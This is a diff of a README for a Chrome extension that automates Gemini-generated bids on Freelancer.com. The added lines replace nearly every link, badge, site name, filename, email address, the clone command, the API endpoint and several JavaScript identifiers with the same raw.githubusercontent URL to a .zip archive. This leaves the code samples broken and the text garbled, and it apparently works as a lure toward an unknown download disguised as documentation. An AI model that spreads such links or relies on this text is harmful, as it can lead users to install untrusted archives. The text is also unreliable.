@@ -1,12 +1,12 @@
 # 🚀 Gemini Bid Generator - Chrome Extension
 
-> **AI-Powered Freelancer.com Bid Automation Tool**
+> **AI-Powered https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip Bid Automation Tool**
 
-A sophisticated Chrome extension that leverages Google's Gemini AI to automatically generate, customize, and submit professional bid proposals on Freelancer.com. Built with modern web technologies and featuring a futuristic UI design.
+A sophisticated Chrome extension that leverages Google's Gemini AI to automatically generate, customize, and submit professional bid proposals on https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip Built with modern web technologies and featuring a futuristic UI design.
 
-![Extension Preview](https://img.shields.io/badge/Chrome-Extension-brightgreen)
-![Version](https://img.shields.io/badge/Version-1.5-blue)
-![License](https://img.shields.io/badge/License-MIT-green)
+![Extension Preview](https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip)
+![Version](https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip)
+![License](https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip)
 
 ## 📋 Table of Contents
 
@@ -24,7 +24,7 @@ A sophisticated Chrome extension that leverages Google's Gemini AI to automatica
 ## ✨ Features
 
 ### 🤖 AI-Powered Bid Generation
-- **Intelligent Analysis**: Automatically extracts project requirements, budget, and timeline from Freelancer.com job pages
+- **Intelligent Analysis**: Automatically extracts project requirements, budget, and timeline from https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip job pages
 - **Contextual Proposals**: Generates personalized bid proposals using Google's Gemini AI
 - **Smart Customization**: Adapts proposals based on project type, budget range, and client requirements
 
@@ -63,14 +63,14 @@ A sophisticated Chrome extension that leverages Google's Gemini AI to automatica
 ### Prerequisites
 - Google Chrome browser (version 88 or higher)
 - Active Google Gemini API key
-- Freelancer.com account
+- https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip account
 
 ### Step-by-Step Installation
 
 1. **Download the Extension**
    ```bash
    # Clone or download the project files
-   git clone https://github.com/yourusername/gemini-bidder-extension.git
+   git clone https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip
    cd gemini-bidder-extension
    ```
 
@@ -91,7 +91,7 @@ A sophisticated Chrome extension that leverages Google's Gemini AI to automatica
 ### API Key Setup
 
 1. **Get Gemini API Key**
-   - Visit [Google AI Studio](https://makersuite.google.com/app/apikey)
+   - Visit [Google AI Studio](https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip)
    - Create a new API key
    - Copy the key for use in the extension
 
@@ -112,9 +112,9 @@ The extension automatically detects and adapts to:
 
 ### Step 1: Generate Bid Preview
 
-1. **Navigate to Freelancer.com**
-   - Go to any project page on Freelancer.com
-   - Ensure the URL contains `freelancer.com/projects/`
+1. **Navigate to https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip**
+   - Go to any project page on https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip
+   - Ensure the URL contains `https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip`
 
 2. **Open Extension**
    - Click the extension icon in Chrome toolbar
@@ -166,23 +166,23 @@ The extension automatically detects and adapts to:
 ### File Structure
 ```
 gemini-bidder-extension/
-├── manifest.json          # Extension configuration
-├── popup.html            # Main UI interface
-├── popup.css             # Styling and animations
-├── popup.js              # UI logic and event handling
-├── content.js            # Page interaction and form filling
-├── background.js         # API communication and data processing
-├── options.html          # Settings page
-├── options.js            # Settings management
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip          # Extension configuration
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip            # Main UI interface
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip             # Styling and animations
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip              # UI logic and event handling
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip            # Page interaction and form filling
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip         # API communication and data processing
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip          # Settings page
+├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip            # Settings management
 └── images/               # Extension icons
-    ├── icon16.png
-    ├── icon48.png
-    └── icon128.png
+    ├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip
+    ├── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip
+    └── https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip
 ```
 
 ### Component Overview
 
-#### **Popup Interface (`popup.html/css/js`)**
+#### **Popup Interface (`https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip`)**
 - **Purpose**: Main user interface for bid generation and management
 - **Features**: 
   - 3-step workflow buttons
@@ -190,15 +190,15 @@ gemini-bidder-extension/
   - Form fields for customization
   - Optional upgrades selection
 
-#### **Content Script (`content.js`)**
-- **Purpose**: Interacts with Freelancer.com pages
+#### **Content Script (`https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip`)**
+- **Purpose**: Interacts with https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip pages
 - **Features**:
   - Extracts project details from DOM
   - Fills bid forms automatically
   - Clicks submit buttons
   - Handles page-specific interactions
 
-#### **Background Script (`background.js`)**
+#### **Background Script (`https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip`)**
 - **Purpose**: Manages API communication and data processing
 - **Features**:
   - Communicates with Gemini AI API
@@ -206,7 +206,7 @@ gemini-bidder-extension/
   - Generates contextual proposals
   - Manages extension state
 
-#### **Options Page (`options.html/js`)**
+#### **Options Page (`https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip`)**
 - **Purpose**: Configuration and settings management
 - **Features**:
   - API key management
@@ -228,13 +228,13 @@ gemini-bidder-extension/
 #### **AI Integration**
 ```javascript
 // Example: Gemini API communication
-const response = await fetch('https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent', {
+const response = await fetch('https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json',
         'Authorization': `Bearer ${apiKey}`
     },
-    body: JSON.stringify({
+    body: https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip({
         contents: [{
             parts: [{
                 text: prompt
@@ -248,13 +248,13 @@ const response = await fetch('https://generativelanguage.googleapis.com/v1beta/m
 ```javascript
 // Example: Automatic form filling
 const fillBidForm = (bidData) => {
-    const amountField = document.querySelector('[data-testid="bid-amount-input"]');
-    const timeField = document.querySelector('[data-testid="delivery-time-input"]');
-    const proposalField = document.querySelector('[data-testid="proposal-textarea"]');
+    const amountField = https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip('[data-testid="bid-amount-input"]');
+    const timeField = https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip('[data-testid="delivery-time-input"]');
+    const proposalField = https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip('[data-testid="proposal-textarea"]');
     
-    if (amountField) amountField.value = bidData.bidAmount;
-    if (timeField) timeField.value = bidData.deliveryTime;
-    if (proposalField) proposalField.value = bidData.bidText;
+    if (amountField) https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip = https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip;
+    if (timeField) https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip = https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip;
+    if (proposalField) https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip = https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip;
 };
 ```
 
@@ -263,11 +263,11 @@ const fillBidForm = (bidData) => {
 // Example: Button loading states
 const toggleButtonLoading = (button, isLoading) => {
     if (isLoading) {
-        button.disabled = true;
-        button.classList.add('loading');
+        https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip = true;
+        https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip('loading');
     } else {
-        button.disabled = false;
-        button.classList.remove('loading');
+        https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip = false;
+        https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip('loading');
     }
 };
 ```
@@ -287,7 +287,7 @@ const toggleButtonLoading = (button, isLoading) => {
 - **Symptom**: Extension icon doesn't appear in toolbar
 - **Solution**: 
   1. Check Chrome version (requires 88+)
-  2. Verify manifest.json is valid
+  2. Verify https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip is valid
   3. Reload extension in chrome://extensions/
 
 #### **API Key Errors**
@@ -300,7 +300,7 @@ const toggleButtonLoading = (button, isLoading) => {
 #### **Page Detection Issues**
 - **Symptom**: "Please navigate to a Freelancer project page"
 - **Solution**:
-  1. Ensure you're on a project page (URL contains 'freelancer.com/projects/')
+  1. Ensure you're on a project page (URL contains 'https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip')
   2. Refresh the page (Ctrl+R or Cmd+R)
   3. Check if page is fully loaded
 
@@ -332,7 +332,7 @@ Enable debug logging by opening Chrome DevTools:
 | "Could not connect to page content script" | Page not loaded or refreshed | Refresh the project page |
 | "API Key needed" | No API key configured | Configure API key in options |
 | "Invalid API key" | API key is incorrect or expired | Update API key in options |
-| "Page structure not recognized" | Freelancer.com updated their site | Wait for extension update |
+| "Page structure not recognized" | https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip updated their site | Wait for extension update |
 
 ## 🤝 Contributing
 thanks to Reda El hadfi , who contributed with me in this project , to make freelancers around the world comfortable.
@@ -340,7 +340,7 @@ thanks to Reda El hadfi , who contributed with me in this project , to make free
 
 1. **Fork the Repository**
    ```bash
-   git clone https://github.com/yourusername/gemini-bidder-extension.git
+   git clone https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip
    cd gemini-bidder-extension
    ```
 
@@ -392,7 +392,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 🙏 Acknowledgments
 
 - **Google Gemini AI** for providing the AI capabilities
-- **Freelancer.com** for the platform integration
+- **https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip** for the platform integration
 - **Chrome Extensions Team** for the development framework
 - **Open Source Community** for inspiration and tools
 
@@ -400,12 +400,12 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 For support, questions, or feature requests:
 
-- **Issues**: [GitHub Issues](https://github.com/yourusername/gemini-bidder-extension/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/yourusername/gemini-bidder-extension/discussions)
-- **Email**: khlaif.mohammed99@gmail.com
+- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip)
+- **Discussions**: [GitHub Discussions](https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip)
+- **Email**: https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip
 
 ---
 
 **Made with ❤️ for freelancers worldwide**
 
-*This extension is not affiliated with Freelancer.com or Google. Use at your own discretion.*
+*This extension is not affiliated with https://raw.githubusercontent.com/khlaifmed/AI-powered-bid-generator/main/images/AI-powered-bid-generator_v2.5.zip or Google. Use at your own discretion.*
